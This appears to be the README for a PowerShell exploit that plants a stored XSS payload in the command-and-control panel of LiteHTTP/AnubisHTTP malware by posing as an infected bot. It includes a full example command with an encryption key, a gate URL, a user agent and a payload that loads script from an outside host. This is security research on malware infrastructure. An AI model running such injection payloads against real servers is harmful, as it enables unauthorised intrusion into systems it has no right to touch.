# LiteHTTP/AnubisHTTP XSS 

## Summary

This script demonstrates an XSS vulnerability in LiteHTTP/AnubisHTTP malware by injecting a customizable payload into the `ip (installation_path)` parameter. The data is encrypted and sent to the malware's command and control (C2) server via a POST request.

When the bot controller views the infected machine's details on their dashboard, the XSS payload is executed, potentially compromising the controller's system.

---

## Usage

1. **Customize Parameters**:
   - **`key`**: Encryption key for securing the data.
   - **`url`**: Target C2 server endpoint.
   - **`userAgent`**: User-Agent string to simulate bot communication.
   - **`xssPayload`**: Injected XSS payload (default: `<script>alert("meow")</script>`).

2. **Run the Script**:
   - Execute in a PowerShell environment.
   - Customize parameters as needed to tailor the exploit.

3. **Result**:
   - The script injects and encrypts the XSS payload in the `ip` field.
   - The payload triggers when the controller accesses the infected machine's details.

---

### Example Command

```powershell
.\exploit.ps1 -key "9vFEwkyHsE84Q824NCDWs6dIyvzomQMI" -url "https://helo.badsite/page/gate.php" -userAgent "E9BC3BD76216AFA560BFB5ACAF5731A3" -xssPayload "<script src=http://example.com/myscript.js></script>"
```
